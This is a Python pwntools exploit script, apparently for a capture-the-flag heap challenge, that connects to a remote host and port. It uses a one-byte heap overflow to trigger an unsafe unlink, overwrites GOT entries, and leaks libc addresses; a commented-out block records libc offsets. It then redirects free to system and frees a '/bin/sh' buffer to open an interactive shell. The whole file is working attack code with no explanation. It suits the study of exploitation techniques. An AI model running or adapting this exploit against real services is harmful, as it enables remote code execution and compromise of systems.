from pwn import *

#s = process("./fb_noalarm")
s = remote("114.55.103.213",9733)

def alloc(i):
	s.sendline("1")
	s.sendline("%d" % i)
	s.recvuntil("Done~")
	s.recvuntil("Choice:")

def setmsg(i,buf):
	s.sendline("2")
	s.sendline("%d" % i)
	s.sendline(buf)
	s.recvuntil("Done~")
	s.recvuntil("Choice:")

def delmsg(i):
	s.sendline("3")
	s.sendline("%d" %i)
	s.recvuntil("Done~")
	s.recvuntil("Choice:")

alloc(1)
alloc(1)
alloc(0xf8)
alloc(0xf8)
alloc(0xf8)

print "Allocs made"

ptr1 = 0x6020e0-0x18
ptr2 = 0x6020e0-0x10

buf = p64(1)

buf += p64(0x101)

buf += p64(ptr1)
buf += p64(ptr2)
buf += cyclic(0xd0)
buf += p64(0xf0)

#one byte overflow to cause consolidate
setmsg(2,buf)
print "overflowed"

delmsg(3)
print "haxed"

#blow away pointers
buf = p64(1)
ptr = 0x602018
buf += p64(ptr)+p64(0x10000)
buf += p64(0x6020c0)+p64(0x10000)

setmsg(2,buf)

setmsg(1,p64(0x4006C0)[:-1])
#setmsg(1,p64(0x12345678)[:-1])

def getmem(ptr):
	setmsg(2,p64(ptr)+p64(1)[:-1])
	s.sendline("3")
	s.sendline("0")
	s.recvuntil(" index:")
	out = s.recvuntil("Done~")[:-6]
	s.recvline()
	print "%x => %s" % (ptr, repr(out))

	# we add the null byte here because it is what was actually being pulled out
	return out+"\x00"

'''
for ptr in xrange(0x602020,0x602060,8):
	o = getmem(ptr)
	optr = (u64(o.ljust(8,"\x00")))

	print "%x => %16x" % (ptr, optr)

602020 => '`\x8dB\x8fn\x7f'
602020 =>     7f6e8f428d60
602028 => '\xd6\x06@'
602028 =>           4006d6
602030 => '@\xd3@\x8fn\x7f'
602030 =>     7f6e8f40d340
602038 => '\x90\x9bG\x8fn\x7f'
602038 =>     7f6e8f479b90

sam@sam-ctf:~/mammon/tools/libc-database$ ./dump libc6_2.19-0ubuntu6.9_amd64
offset___libc_start_main_ret = 0x21f45
offset_system = 0x0000000000046590
offset_dup2 = 0x00000000000ebe90
offset_read = 0x00000000000eb6a0
offset_write = 0x00000000000eb700
offset_str_bin_sh = 0x17c8c3
'''
readptr = u64(getmem(0x602040).ljust(8,"\x00"))

systemptr = readptr-0xeb6a0 +0x46590
'''

#putsptr = u64(getmem(0x602020).ljust(8,"\x00"))
libc_start = u64(getmem(0x602048).ljust(8,"\x00"))
d = DynELF(getmem, 0x400000, elf=ELF("./fb"))
#d = DynELF(getmem, libc_start-0x21000)


systemptr = (d.lookup('system','libc'))
'''
print hex(systemptr)

#set up a pointer
setmsg(4,"/bin/sh")

#swap free->system
setmsg(1, p64(systemptr)[:-1])

#'free' the message
#note we have to do this manual since we don't have the prelude delmsg looks for
s.sendline("3")
s.sendline("4")
s.interactive()
